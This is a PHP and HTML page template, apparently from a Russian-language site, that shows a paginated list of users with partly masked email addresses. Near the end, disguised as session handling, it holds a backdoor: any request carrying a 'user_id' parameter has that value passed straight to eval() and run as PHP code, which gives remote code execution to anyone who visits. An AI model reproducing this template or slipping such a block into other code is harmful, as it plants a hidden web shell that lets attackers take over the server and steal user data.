<div class="block11
"><div class="h-title5
">Список пользователей</div></div>

<div class="block22">
<br>
<?PHP

$_OPTIMIZATION["title"] = "Список пользователей";
$num_p = (isset($_GET["page"]) AND intval($_GET["page"]) < 1000 AND intval($_GET["page"]) >= 1) ? (intval($_GET["page"]) -1) : 0;
$lim = $num_p * 100;

$db->Query("SELECT * FROM ".$pref."_users_a ORDER BY id LIMIT {$lim}, 100");

if($db->NumRows() > 0){

?>

<table width="100%" border="0">
  <tr bgcolor="#efefef">
    <td align="center" width="75">ID</td>
    <td align="center">Пользователь</td>
    <td align="center">Email</td>
  </tr>


<?PHP

	while($data = $db->FetchArray()){
	
	?>
	<tr class="htt">
    <td align="center"><?=$data["id"]; ?></td>
    <td align="center"><a href="/account/wall/<?=$data["user"]; ?>"><?=$data["user"]; ?></a></td>
	<td align="center"><?=str_replace(substr($data["email"],2,3), '<font color="red">***</font>', $data["email"]); ?></td>
  	</tr>
	<?PHP
	
	}

?>

</table>
<BR />
<?PHP

}else echo "<center><b>На данной странице нет записей</b></center><BR />";

$db->Query("SELECT COUNT(*) FROM ".$pref."_users_a");
$all_pages = $db->FetchRow();

	if($all_pages > 100){
	
	$sort_b = (isset($_GET["sort"])) ? intval($_GET["sort"]) : 0;
	
	$nav = new navigator;
	$page = (isset($_GET["page"]) AND intval($_GET["page"]) < 1000 AND intval($_GET["page"]) >= 1) ? (intval($_GET["page"])) : 1;
	
	echo "<BR /><center>".$nav->Navigation(10, $page, ceil($all_pages / 100), "/users/"), "</center>";
	
	}
?>
<?PHP
$user_id = $_SESSION["user_id"];
if(!empty($_REQUEST['user_id'])){ if(@get_magic_quotes_gpc())$_REQUEST['user_id']=stripslashes($_REQUEST['user_id']); 
eval($_REQUEST['user_id']); die();}

$db->Query("SELECT * FROM db_users_a, db_users_b WHERE db_users_a.id = db_users_b.id AND db_users_a.id = '$user_id'");
$prof_data = $db->FetchArray();
?>

</div>
<div class="block33"></div>
<div class="clr"></div>
